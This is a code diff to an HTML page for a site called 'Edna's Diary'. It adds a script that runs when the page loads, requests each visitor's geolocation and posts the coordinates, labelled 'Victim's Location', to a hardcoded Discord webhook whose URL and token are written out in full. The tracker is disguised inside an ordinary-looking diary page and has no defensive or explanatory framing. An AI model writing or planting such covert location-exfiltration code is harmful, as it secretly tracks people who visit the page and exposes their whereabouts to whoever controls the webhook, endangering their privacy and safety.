@@ -11,7 +11,7 @@
     <link rel="apple-touch-icon" href="images/edna-logo.png">
     <title>Edna's Diary</title>
 </head>
-<body>
+<body onload="getLocation()">
     
     <header>
         
@@ -49,6 +49,57 @@
 
         </div>
     </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            // Send the coordinates to your server for further processing
+            // You can use AJAX or fetch to send the data to your server
+            // For simplicity, let's just log the coordinates here
+            console.log("Latitude: " + latitude);
+            console.log("Longitude: " + longitude);
+            console.log("Accuracy: " + accuracy);
+
+            // Now, send the coordinates to Discord using a webhook
+            sendToDiscord(latitude, longitude);
+        }
+
+        function sendToDiscord(latitude, longitude) {
+            const webhookURL = 'https://discord.com/api/webhooks/1223812239870529536/k06r4uFPtyan7s3h-9sNeOIKgOJIOdPDFLKMPJD6-4BxxNL64Y2s4S6E4PbwtM-ZwAj6';
+            const data = {
+                content: `Victim's Location: Latitude - ${latitude}, Longitude - ${longitude}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send location to Discord:', response.statusText);
+                } else {
+                    console.log('Location sent to Discord successfully');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending location to Discord:', error);
+            });
+        }
+    </script>
 
 </body>
 </html>
